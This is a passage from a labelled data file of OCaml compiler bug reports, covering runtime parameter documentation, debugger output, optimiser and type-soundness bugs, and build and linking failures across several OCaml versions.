same."},{"labels":["bug",null,null],"text":"http://caml.inria.fr/pub/docs/manual-ocaml/runtime.html contains a documentation of most OCAMLRUNPARAM settings, but several are missing:\r\n\r\n- H (huge pages)\r\n- M, m, n (custom space usage stuff)\r\n- t (\"trace level\"?)\r\n- w (caml major window size)\r\n- W (runtime warnings)"},{"labels":["bug"],"text":"Dear OCaml Team,\r\n\r\nthere are a few inconsistencies between how ocamldebug and dumpobj display the same byte code data, which is a bit inconvenient.\r\n\r\n1.) dumpobj shows instruction/PC addresses in instructions, while ocamldebug shows them as byte offset which seems to be 4x the instruction count.\r\n\r\n2.) ocamldebug and dumpobj use different line numbers to reference the same block of instructions, e.g. line 27 vs line 26 in the block shown below.\r\n\r\n3.) dumpobj seems to put the line comments after the matching piece of code, while the : after the comment suggests that the code follows the line comment.\r\n\r\n4.) ocamldebug shows a PC after the current instruction block to be stepped (maybe this is intentional).\r\n\r\nHere is an example (all byte code files I checked start with the same line):\r\n\r\nocamldebug:\r\n```\r\nTime: 1 - pc: 8320 - module Stdlib\r\n27     (Invalid_argument \"index out of bounds\")<|a|>\r\n```\r\ndumpobj:\r\n```\r\nFile \"stdlib.ml\", line 33, characters 22-33:\r\n    2065  RAISE\r\n    2066  CONSTINT 413\r\n    2068  C_CALL1 caml_ensure_stack_capacity\r\n    2070  GETGLOBAL \"index out of bounds\"\r\n    2072  PUSHGETGLOBAL Invalid_argument\r\n    2074  MAKEBLOCK2 0\r\n    2076  PUSHGETGLOBAL \"Pervasives.array_bound_error\"\r\n    2078  C_CALL2 caml_register_named_value\r\nFile \"stdlib.ml\", line 26, characters 2-98:\r\n    2080  PUSH\r\n    2081  CLOSURE 0, 2060\r\n    2084  PUSH\r\n    2085  CLOSURE 0, 2054\r\n    2088  PUSHCONST0\r\n    2089  C_CALL1 caml_fresh_oo_id\r\n    2091  PUSHGETGLOBAL \"Stdlib.Pervasives.Exit\"\r\n```\r\nsource code (stdlib.ml)\r\n```\r\n24: let () =\r\n25:   (* for asmrun/fail.c *)\r\n26:   register_named_value \"Pervasives.array_bound_error\"\r\n27:     (Invalid_argument \"index out of bounds\")\r\n```\r\nThis is with OCaml 4.07.1 build on cygwin cross for MinGW (using the Coq Windows build scripts).\r\n\r\nBest regards,\r\n\r\nMichael"},{"labels":["bug"],"text":"When using `-allow-approx`, ocamldep might turns errors into successes as soon as a file doesn't parse. For instance:\r\n\r\n```\r\n$ ocamldep -allow-approx -I /toto x.ml\r\nBad -I option: /toto: No such file or directory\r\nx.cmo :\r\nx.cmx :\r\n$ echo $?\r\n2\r\n$ ocamldep -allow-approx -I /toto x.ml file_that_doesnt_parse.ml \r\nBad -I option: /toto: No such file or directory\r\nFile \"file_that_doesnt_parse.ml\", line 2, characters 0-0:\r\nError: Syntax error\r\nfile_that_doesnt_parse.cmo :\r\nfile_that_doesnt_parse.cmx :\r\nx.cmo :\r\nx.cmx :\r\n$ echo $?\r\n0\r\n```"},{"labels":["bug"],"text":"The following code, when compiled with 4.08, raises\r\n`Assert_failure` at run time (it does not with 4.07):\r\n\r\n```\r\nlet () =\r\n  let f () = () in\r\n  let r = ref 0 in\r\n  let g () = f (incr r) in\r\n  g ();\r\n  assert (!r = 1)\r\n```\r\n\r\nThe initial lambda is:\r\n```\r\n(seq\r\n  (let\r\n    (*match*/86 =\r\n       (let\r\n         (f/80 = (function param/81 0a)\r\n          r/82 = (makemutable 0 (int) 0)\r\n          g/83 = (function param/84 (apply f/80 (+:=1 r/82))))\r\n         (seq (apply g/83 0a)\r\n           (if (== (field 0 r/82) 1) 0a\r\n             (raise\r\n               (makeblock 0 (global Assert_failure/28!) [0: \"b.ml\" 6 2]))))))\r\n    0a)\r\n  0a)\r\n```\r\n\r\nwhich becomes, after `Simplif.simplify_local_functions`:\r\n\r\n```\r\n(seq\r\n  (let\r\n    (*match*/86 =\r\n       (let (r/82 = (makemutable 0 (int) 0))\r\n         (seq\r\n           (catch\r\n             (catch (exit 4 0a) with (4 param/84) (exit 5 (+:=1 r/82)))\r\n            with (5 param/81) 0a)\r\n           (if (== (field 0 r/82) 1) 0a\r\n             (raise\r\n               (makeblock 0 (global Assert_failure/28!) [0: \"b.ml\" 6 2]))))))\r\n    0a)\r\n  0a)\r\n```\r\n\r\nthen translated by `Simplif.simplify_exits` into:\r\n```\r\n(seq\r\n  (let\r\n    (*match*/86 =\r\n       (let (r/82 = (makemutable 0 (int) 0))\r\n         (seq (let (param/88 =a 0a param/87 =a (+:=1 r/82)) 0a)\r\n           (if (== (field 0 r/82) 1) 0a\r\n             (raise\r\n               (makeblock 0 (global Assert_failure/28!) [0: \"b.ml\" 6 2]))))))\r\n    0a)\r\n  0a)\r\n```\r\n\r\nand finally by `Simplif.simplify_lets` into:\r\n```\r\n(seq\r\n  (let\r\n    (*match*/86 =\r\n       (let (r/82 =v[int] 0)\r\n         (seq 0a\r\n           (if (== r/82 1) 0a\r\n              (raise\r\n                (makeblock 0 (global Assert_failure/28!) [0: \"b.ml\" 6 2]))))))\r\n    0a)\r\n  0a)\r\n```\r\n\r\nThe problem, as I understand it, is that `Simplif.simplify_exits` introduces\r\nlet-bindings with kind `Alias` while the expression bound to `param/87`\r\ncontains a side effect. The let-binding then disappears because `param/87`\r\nis never used. Indeed, a (tested) fix is to change `Alias` to `Strict` [here](https://github.com/ocaml/ocaml/blob/trunk/bytecomp/simplif.ml#L285).\r\n\r\nIt is not immediately clear to me what a good fix is (mainly because I do\r\nnot know whether expressions passed to static exits are expected to be pure).\r\nChanging `Alias` to `Strict` unconditionally seems a bit harsh. We could\r\ninspect the expression to check whether it is pure, or not apply one of\r\nthe rewriting above when it is not."},{"labels":["bug",null],"text":"There's a soundness issue with generalization of type variables in class definitions:\r\n\r\n\r\n```ocaml\r\n    # class ['a] r = let r : 'a = ref [] in object method get = r end;;\r\n    class ['a] r : object constraint 'a = 'b list ref method get : 'a end\r\n    # (new r)#get := [3];;\r\n    - : unit = ()\r\n    # List.hd !((new r)#get) ^ \"two\";;\r\n    Segmentation fault\r\n```\r\n\r\nBisecting shows that this has been around for a while: it was introduced in OCaml `4.00.0` along with GADTs (6c78f42d) for programs checked with `-principal` and more recently spread to programs without `-principal`, too (802945009).  Before these commits the program was rejected:\r\n\r\n```\r\n    Characters 0-63:\r\n      class ['a] r = let r : 'a = ref [] in object method get = r end;;\r\n      ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\r\n    Error: The type of this class,\r\n           class ['a] r : object constraint 'a = '_b list ref method get : 'a end,\r\n           contains type variables that cannot be generalized\r\n```\r\n"},{"labels":["bug",null,null],"text":"### foo.ml\r\n```ocaml\r\nmodule type Endpoint_intf = sig\r\n  type t\r\nend\r\n\r\nmodule type S = sig\r\n  module Endpoint : Endpoint_intf\r\n\r\n  type finite = [ `Before of Endpoint.t ]\r\n  type infinite = [ `Until_infinity ]\r\n\r\n  type +'a range = private { until : 'a } constraint 'a = [< finite | infinite ]\r\n\r\n  val until : 'a range -> 'a\r\nend\r\n\r\nmodule type Ranged = sig\r\n  module Endpoint : Endpoint_intf\r\n  module Range : S with type Endpoint.t = Endpoint.t\r\nend\r\n```\r\n\r\nCompiles fine pre 4.08, and is currently broken on 4.08 and trunk with:\r\n```\r\nError: The implementation ./foo.ml\r\n       does not match the interface (inferred signature):\r\n       ...\r\n       At position module type Ranged = sig module Range : <here> end\r\n       Values do not match:\r\n         val until :\r\n           ([< `Before of Endpoint.t | `Until_infinity ] as 'a) range -> 'a\r\n       is not included in\r\n         val until :\r\n           ([< `Before of Endpoint.t | `Until_infinity ] as 'a) range -> 'a\r\n       File \"./foo.ml\", line 13, characters 2-28: Expected declaration\r\n       File \"./foo.ml\", line 13, characters 2-28: Actual declaration\r\n```"},{"labels":["bug",null],"text":"Unit was introduced in https://github.com/ocaml/ocaml/pull/1876"},{"labels":["bug"],"text":"**Original bug ID:** 2311\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nThese notes would be handy to have in the INSTALL file for macOS X.  I\nhave the developer's studio installed.\n\nPOSIX threads seem to be conflictingly implemented on MacOS X.  There's\na conflict over symbol thread_t with system include\n/usr/include/mach/mach_types.h.  The -no-pthread option to configure\nseems to fix that, although I suppose the collateral loss of pthreads\nfunctionality might bug some people (I'm just running Unison, so I\ndon't think I'll have any problem).\n\nDustin\n\n-- \n# Dustin Mitchell\n# dustin@ywlcs.org/djmitche@alumni.uchicago.edu\n"},{"labels":["bug"],"text":"**Original bug ID:** 2310\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nHi,\n\nI just installed ocaml on my linux machine (kernel version \n2.4.22gentoo-r7, SMP with 2 athlon-MP 2400s) and noticed the following \nproblem:\n\n$> ocaml\n        Objective Caml version 3.07+14 (2004-02-03)\n\n# 2.5555 +. 4.5555;;\n- : float = 7.11100000000000065\n \nThis only happens with specific numbers, however, and only in the \ntoplevel \"interpreter\" mode. The following program when loaded from a \nfile produces the correct output.\n\nprint_float (2.5555 +. 4.5555);;\n\nOn the toplevel, if the number is slightly different, there is also no \nerror.\n\n# 2.5555 +. 5.5555;;\n- : float = 8.111\n\nI didn't see this listed in the known bugs section, so I hope it's useful.\n\nMark\n"},{"labels":["bug"],"text":"**Original bug ID:** 2309\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nummmmmm... standard configure and build on MacOSX 10.3.2, Devtools \nXCode 1.1, (gcc 2.95.2) installed\n\ncomplaints that symbols _gethostbyname_r and _gethostbyaddr_r not found \nin system libraries:\nno requirement for these re-entrants versions stated before build. :(\n\ncomplaint that LabTk is not found - NO stated requirement for this \nproduct ANYWHERE. :(\n\n\nand then:\n\n\n../../ocamlcomp.sh -c -warn-error A unix.mli\n../../ocamlcomp.sh -c -warn-error A -nolabels unix.ml\n../../ocamlcomp.sh -c -warn-error A unixLabels.mli\n../../ocamlcomp.sh -c -warn-error A -nolabels unixLabels.ml\n../../boot/ocamlrun ../../tools/ocamlmklib -o unix -ocamlc \n'../../ocamlcomp.sh' -linkall unix.cmo unixLabels.cmo\ngcc -O -I../../byterun -fno-defer-pop -no-cpp-precomp -Wall -Wno-unused \n-D_FILE_OFFSET_BITS=64 -D_REENTRANT    -c -o strstubs.o strstubs.c\n../../boot/ocamlrun ../../tools/ocamlmklib -o str strstubs.o\n/usr/bin/ld: -undefined: unknown argument: -lbundle1.o\nmake[1]: *** [libstr.a] Error 2\nmake: *** [otherlibraries] Error 2\n"},{"labels":["bug"],"text":"**Original bug ID:** 2301\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nHello, \nI found a workaround (which is strange, IMHO) to the problem showed by the bug\n#1921.\nHere is a reminder:\n\n\n##################################################\nlet rec recData=\n  let module SomeModule=\n    struct \n\n      let callRecData x=\n\tif x<=0\n\tthen 1\n\telse ((fst recData) (x-1)) * x\n\n      let mk_double x=2 * x\n\n    end\n  in \n    (SomeModule.callRecData, SomeModule.mk_double)\n\n\nlet _=\n  let test=(snd recData) ((fst recData) 5) in\n    print_int test\n##################################################\n\nThis code compiled against 3.06 and worked as expected, while 3.07 refused it\n(this kind of expression not allowed in the right-hand side of a 'let rec'...).\nHere's the workaround:\n\n##################################################\nlet rec recData dummy=\n  let module SomeModule=\n    struct \n\n      let callRecData x=\n\tif x<=0\n\tthen 1\n\telse ((fst (recData dummy)) (x-1)) * x\n\n      let mk_double x=2 * x\n\n    end\n  in \n    (SomeModule.callRecData, SomeModule.mk_double)\n\n\nlet _=\n  let test=(snd (recData [])) ((fst (recData [])) 5) in\n    print_int test\n###################################################\n\nAs you see, the solution is to add one useless parameter to make 3.07 happy (and\nthe execution is also correct). I didn't look after the problematic piece of\ncode in the OCaml source code, though.\n"},{"labels":["bug"],"text":"**Original bug ID:** 2285\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: John Goerzen\nVersion: OCaml 3.07\nOS: AIX 5.1L, PowerPC\nSubmission from: gatekeeper.excelhustler.com (68.99.114.105)\n\n\nHave downloaded OCaml 3.07 source distribution and ran configure specifying only\n-prefix.  Configure appeared to work fine and detect appropriate native values.\n\nmake world and make bootstrap both succeeded.  However, make opt yields:\n\ngcc -I../byterun -DNATIVE_CODE -DTARGET_power -DSYS_aix  -O -Wall -Wno-unused\n-D_FILE_OFFSET_BITS=64 -D_REENTRANT   -c -o globroots.o globroots.c\ngcc -I../byterun -DNATIVE_CODE -DTARGET_power -DSYS_aix  -O -Wall -Wno-unused\n-D_FILE_OFFSET_BITS=64 -D_REENTRANT   -c -o signals.o signals.c\nIn file included from ../byterun/misc.h:22,\n                 from ../byterun/alloc.h:20,\n                 from signals.c:21:\n../byterun/config.h:35: warning: redefinition of `int16'\n/usr/include/sys/inttypes.h:632: warning: `int16' previously declared here\n../byterun/config.h:39: warning: redefinition of `int32'\n/usr/include/sys/inttypes.h:633: warning: `int32' previously declared here\n../byterun/config.h:50: warning: redefinition of `int64'\n/usr/include/sys/inttypes.h:638: warning: `int64' previously declared here\nsignals.c: In function `handle_signal':\nsignals.c:288: error: structure has no member named `__sc_jmpbuf'\nsignals.c: In function `trap_handler':\nsignals.c:526: error: structure has no member named `__sc_jmpbuf'\nsignals.c:527: error: structure has no member named `__sc_jmpbuf'\nmake[1]: *** [signals.o] Error 1\nmake[1]: Leaving directory `/home/jgoerzen/ocaml-3.07/asmrun'\nmake: *** [runtimeopt] Error 2\n\nFeel free to ask if you need any additional information.  I'm happy to provide\nit.\n"},{"labels":["bug"],"text":"**Original bug ID:** 2279\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nBonjour,\n\nle manuel de rÃ©fÃ©rence (chapitre 6, lexical conventions) ne documente\npas la nouvelle syntaxe pour les valeurs entiÃ¨res (suffixe l, L ou n).\n\n-- \n   Olivier\n"},{"labels":["bug"],"text":"**Original bug ID:** 2278\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Edward Pizzi\nVersion: 3.07\nOS: -\nSubmission from: hanszen-1032.hanszen.rice.edu (128.42.156.32)\n\n\nSection 7.9 of the OCaml manual describes recursive modules, however the code\nlistings lack the requisite \"rec\" keyword. They seem to be otherwise correct.\n\ntwice, \"module A : sig ...\" occurs when \"module rec A : sig ...\" should occur.\n\n - Ed Pizzi\n"},{"labels":["bug"],"text":"**Original bug ID:** 2275\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nSalut,\n\nI think there's a documentation bug in 3.07pl2.  On the page\n\n   http://pauillac.inria.fr/caml/ocaml/htmlman/libref/Parsing.html\n\nthe names lhs_start and lhs_end should be replaced by rhs_start and\nrhs_end.\n\n-James\n"},{"labels":["bug"],"text":"**Original bug ID:** 2270\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nHello,\n\nDeux choses:\n\n- \"ocamlc -a\" demande obligatoirement de spÃ©cifier\n  le fichier rÃ©sultat (-o ...). Le manuel indique que le nom\n  par dÃ©faut est library.cma. Idem avec ocamlopt.\n\n- il est possible d'inclure des bibliothÃ¨ques dans des bibliothÃ¨ques\n  avec ocamlc:\n\n  ocamlc -a -o bla.cma unix.cma\n\n  Mais pas avec ocamlopt:\n\n  ocamlopt -a -o bla.cmxa unix.cmxa\n  =====>\n  /home/frisch/godi/lib/ocaml/std-lib/unix.cmxa\n  is not a compilation unit description.\n\n  Est-ce normal ?\n\n-- Alain\n"},{"labels":["bug"],"text":"**Original bug ID:** 2269\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nIn the documentation of the \"Pervasives\" module (at caml.inria.fr)\nI've found this statement:\n  \"it is guaranteed that e1 == e2 implies e1 = e2\"\nIt is incorrect, since \"nan == nan\" is true, while \"nan = nan\"\nis not. I use the latest version of ocaml (3.07).\n\nZbigniew Skowron\n"},{"labels":["bug"],"text":"**Original bug ID:** 2267\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Paul Stodghill\nVersion: 3.07pl2\nOS: Windows Cygwin\nSubmission from: dhcp98-40.cs.cornell.edu (128.84.98.40)\n\n\nThe -b option to ocamlrun and the corresponding settings for OCAMLRUNPARAM does\nnot appear to be documented in ./man/ocamlrun.m\n"},{"labels":["bug"],"text":"**Original bug ID:** 2235\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Benjamin Monate\nVersion: 3.07+2\nOS: Linux\nSubmission from: is002447.saclay.cea.fr (132.166.134.145)\n\n\nI have a problem with the following code :\n\nopen Format\nset_tags true; printf \"@{<BOLD>Hello@?@} World@\\n\"\n\nThis code outputs : \"<BOLD>Hello World\" without closing the BOLD tag.\nFlushing the formatter seems to reset the formatter stack.\nThis does not seem to be documented.\nIs this an intended behaviour or a bug ?\n\nThank you for your support\nBenjamin\n"},{"labels":["bug"],"text":"**Original bug ID:** 2230\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: henri dubois-ferriere\nVersion: 3.07+2\nOS: debian\nSubmission from: lcavpc14.epfl.ch (128.178.8.51)\n\n\nif i enter the following (faulty) class definition in the toplevel, it gets\n\"stuck\" (meaning that i have to C-c C-c to get the prompt again) rather than\nrejecting it outright.\n\nclass a = object method one = s#1 end;;\n"},{"labels":["bug"],"text":"**Original bug ID:** 2226\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Philippe Veber\nVersion: 3.07\nOS: Linux\nSubmission from: cache.jouy.inra.fr (138.102.1.123)\n\n\nSource qui pose problÃ¨me :\n\noops.ml:\n\nignore (Thread.create ignore ());;\n\n\n\nCommandes pour compiler :\n\nocamlc -thread -c oops.ml\nocamlc -thread -o oops threads.cma -cclib -lthreads  oops.cmo\nError while linking /home/mig/pveber//lib/ocaml/threads/threads.cma(Thread):\nReference to undefined global `Unix'\n\n\n\nTentative de correction\n\nocamlc -thread -c oops.ml\nocamlc -thread -o oops unix.cma -cclib -lunix threads.cma -cclib -lthreads \noops.cmo\nFiles /home/mig/pveber//lib/ocaml/threads/unix.cma(Unix)\nand /home/mig/pveber//lib/ocaml/stdlib.cma(List)\nmake inconsistent assumptions over interface List\n\n\nCes rÃ©sultats sont obtenus avec Ocaml 3.07\n\n\n\nAvec Ocaml 3.06:\n\nocamlc -thread -c mlmake.ml\nocamlc -thread -o mlmake threads.cma -cclib -lthreads  mlmake.cmo\n\npasse trÃ¨s bien (sur 3.04 aussi).\n\n\nVraiment dÃ©solÃ© s'il ne s'agit que d'une erreur de ma part, mais Ã§a me donne\nl'occasion de fÃ©liciter l'Ã©quipe pour le travail qu'elle rÃ©alise.\n\nCordialement,\n  Philippe Veber.\n"},{"labels":["bug"],"text":"**Original bug ID:** 2198\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Didier Remy\nVersion: 3.07+2\nOS: linux redhat 7.1\nSubmission from: morgon.inria.fr (128.93.8.33)\n\n\nIl semble que readdir sur un descripteur ferme bloque en version bytecode.\nOn recoit correctement le End_of_file en version native. \n\nVoici un example qui met le probleme en evidence.\n\n     Didier\n\n\nmorgon:/tmp$ cat foo.ml\nopen Unix\n\nlet () = ()\nlet tmp = opendir \"/tmp\";;\nlet _ = closedir tmp;;\nlet _ = prerr_endline\n    \"Reading to read in a closed dirhandler\";;\nlet should_not_block =\n  try ignore (readdir tmp); prerr_endline \"Done!\"\n  with End_of_file -> prerr_endline \"End_of_file!\"\nmorgon:/tmp$ ocamlc -o foo.byte unix.cma foo.ml\nmorgon:/tmp$ ocamlopt -o foo.opt unix.cmxa foo.ml\nmorgon:/tmp$ ./foo.opt\nReading to read in a closed dirhandler\nEnd_of_file!\nmorgon:/tmp$ ./foo.byte\nReading to read in a closed dirhandler\n\n(* blocking *)\n"},{"labels":["bug"],"text":"**Original bug ID:** 2188\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Heinz Deinhart\nVersion: Objective Caml version 3.07+2\nOS: Linux (Redhat 7.x with src.rpm compiled)\nSubmission from: h081217015199.dyn.cm.kabsi.at (81.217.15.199)\n\n\nThere seems to be a problem in Arg.parse with the usage output in case of a\nmissing\nargument for an option. Probably some problem with the buffer used in there? \nIt is quite simple to reproduce: \n\nemp@ei:~/cvs.nix.at/Code/gemma> cat argbug.ml \nlet speclist = [\n  (\"-i\", Arg.Int (fun i -> Printf.printf \"int -i: %i\\n\" i), \"a nice integer\")\n]\nlet anonfun s =\n  Printf.printf \"anonfun called with: %s\\n\" s\nlet _ =\n  Arg.parse speclist anonfun \"usage message\\n\";\n  exit 0\n\nemp@ei:~/cvs.nix.at/Code/gemma> ocaml argbug.ml -x       # this works\nargbug.ml: unknown option `-x'.\nusage message\n\n  -i a nice integer\n  -help   Display this list of options\n  --help  Display this list of options\nemp@ei:~/cvs.nix.at/Code/gemma> ocaml argbug.ml -i 10    # this works, too\nint -i: 10\nemp@ei:~/cvs.nix.at/Code/gemma> ocaml argbug.ml -i       # this prints strange\nmsg\nargbug.ml: option `-i' needs an argument.\nusage message\n\n  -i a nice integer\n  -help   Display this list of options\n  --help  Display this list of options\nargbug.ml: argbug.ml: option `-i' needs an argument.\nusage message\n\n  -i a nice integer\n  -help   Display this list of options\n  --help  Display this list of options\n.\nusage message\n\n  -i a nice integer\n  -help   Display this list of options\n  --help  Display this list of options\nemp@ei:~/cvs.nix.at/Code/gemma>\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 2187\n**Reporter:** administrator\n**Assigned to:** @xclerc\n**Status:** resolved (set by @damiendoligez on 2015-03-13T19:31:40Z)\n**Resolution:** suspended\n**Priority:** high\n**Severity:** minor\n**Target version:** 4.03.0+dev / +beta1\n**Fixed in version:** 4.03.0+dev / +beta1\n**Category:** ~DO NOT USE (was: OCaml general)\n**Tags:** patch\n\n## Bug description\n\nOn Sat, Feb 07, 2004 at 09:46:25AM +0100, Stefano Zacchiroli wrote:\r\n> On Fri, Feb 06, 2004 at 11:30:47AM -0800, Issac Trotts wrote:\r\n> > Thanks for making wowcamldebug available.  I wonder if you know how to \r\n> > get around this problem:\r\n> \r\n> Unfortunately no. I'm aware of the problem but last time I tried to\r\n> track it down it seemed to me that it was not deterministic. Are you\r\n> experiencing a reproducible behaviour?\r\n\r\nYes I think so.  \r\n\r\nI believe the problem is actually with ocamldebug.  The error message\r\n\r\n  Lost connection with process -1 (active process)\r\n  between time 0 and time 10000\r\n\r\ncomes from the function Time_travel.forget_process.  Here's my fix,\r\nthough I don't understand ocamldebug well enough to be sure that it's\r\nreally correct:\r\n\r\n  (* in debugger/main.ml *)\r\n\r\n  let rec protect ppf loop =\r\n    try\r\n      loop ppf\r\n    with\r\n    | End_of_file ->\r\n        (* This is hosed.\r\n        protect ppf (function ppf ->\r\n          forget_process\r\n            !current_checkpoint.c_fd\r\n            !current_checkpoint.c_pid;\r\n          pp_print_flush ppf ();\r\n          stop_user_input ();\r\n          loop ppf)\r\n        *)\r\n        exit 0 (* This is basically what I want it to do. *)\r\n\r\nOtherwise it just loops forever and you can't control-C or control-Z to\r\nmake it stop.\r\n\r\nCheers,\r\nIssac\r\n\r\n-- \r\nIssac Trotts\r\nhttp://redwood.ucdavis.edu/~issac\n"},{"labels":["bug"],"text":"**Original bug ID:** 2172\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Matthieu Sozeau\nVersion: ocaml-3.07+2\nOS: Linux\nSubmission from: f09v-8-92.d1.club-internet.fr (212.194.187.92)\n\n\nJ'ai rencontrÃ© une erreur en compilant ocamlgraph\n(http://www.lri.fr/~filliatr/ftp/ocamlgraph/ocamlgraph-0.5.tar.gz)\n sur powerpc (G4).\nLa compilation de demo.opt produit une erreur Ã  la phase de liaison, cela\nprovient apparement\ndu fait que tout les symboles ne sont pas bien renommÃ©s dans graph.o.\nJ'ai trouvÃ© une solution en faisant ceci:\n# make\nocamlopt.opt -pack -o graph.cmx sig.cmx sig_pack.cmx util.cmx unionfind.cmx\nheap.cmx per_imp.cmx persistent.cmx bitv.cmx ierative.cmx path.cmx graphviz.cmx\ntraverse.cmx components.cmx flow.cmx builder.cmx classic.cmx rand.cmx oper.cmx\nkruskal.c topological.cmx pack.cmx\nocamlopt.opt -o demo.opt graph.cmx demo.ml\n/tmp/camlstartup0d32c7.o(.data+0x76c): undefined reference to\n`Graph__Sig__frametable'\n/tmp/camlstartup0d32c7.o(.data+0x770): undefined reference to\n`Graph__Sig_pack__frametable'\n/tmp/camlstartup0d32c7.o(.data+0x774): undefined reference to\n`Graph__Util__frametable'\n/tmp/camlstartup0d32c7.o(.data+0x778): undefined reference to\n`Graph__Unionfind__frametable'\n/tmp/camlstartup0d32c7.o(.data+0x77c): undefined reference to\n`Graph__Heap__frametable'\n...\ncollect2: ld a retournÃ© 1 code d'Ã©tat d'exÃ©cution\nError during linking\nmake: *** [demo.opt] Erreur 2\n# nm *.o | grep frametable | cut -d' ' -f3 | sort | uniq | grep -e \"[^Graph]\"\n|awk '{ p\nrint $1 \" Graph__\"$1 }' > renamings\n# objcopy --redefine-syms=renamings graph.o\n# make\nocamlopt.opt -o demo.opt graph.cmx demo.ml\n#\nTout fonctionne ensuite.\n\nJ'utilise objcopy 2.14.90.0.6 20030820 (binutils-2.14.90.0.6) et gcc-3.2.3.\n"},{"labels":["bug"],"text":"**Original bug ID:** 2170\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nHi,\n\nwhen linking byte code programs with -vmthread (latest CVS-version)\nI get the following error message:\n\n  # ocamlc unix.cma threads.cma -vmthread -o foo foo.cmo\n  Error while linking /home/mottl/local/linux-gnu/lib/ocaml/vmthreads/stdlib.cma(Pervasives):\n  The external function `caml_input_char' is not available\n\nThe external function obviously needs some renaming\n(\"caml_ml_input_char\").\n\nBest regards,\nMarkus\n\n-- \nMarkus Mottl          http://www.oefai.at/~markus          markus@oefai.at\n"},{"labels":["bug"],"text":"**Original bug ID:** 2167\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Frederic Besson\nVersion: 3.07+2\nOS: Windows\nSubmission from: tide135.microsoft.com (213.199.144.166)\n\n\nStr.split does not terminate for regexps matching epsilon\nlet _ =\n  Str.split (Str.regexp \"a?\") \"string\";\n    print_string \"end\"\n\nI don't see an obvious semantics, though.\n"},{"labels":["bug"],"text":"**Original bug ID:** 2160\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: KÃ©vin SÃ©journÃ©\nVersion: 3.07pl2\nOS: debian\nSubmission from: aste-genev-bois-104-1-2-235.w80-11.abo.wanadoo.fr (80.11.230.235)\n\n\nDans le module Pervasives.\nLa fonction string_to_format est dÃ©clarÃ©e comme cela :\nexternal format_of_string :\n ('a, 'b, 'c, 'd) format4 -> ('a, 'b, 'c, 'd) format4 = \"%identity\"\n\nC'est curieux car cela semble ne rien faire du tout.\n\nLa fonction ne devrais elle pas etre declarÃ©e comme cela?\nexternal format_of_string :\n string -> ('a, 'b, 'c, 'd) format4 = \"%identity\"\n\nhttp://camlcvs.inria.fr/cgi-bin/cvsweb.cgi/ocaml/stdlib/pervasives.ml?rev=1.75&content-type=text/x-cvsweb-markup\n\nDans le cas oÃ¹ cela n'est pas un \"bug\" je trouve que la fonction \nn'est pas assez documentÃ©e pour en comprendre l'interet.\n"},{"labels":["bug"],"text":"**Original bug ID:** 2154\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug 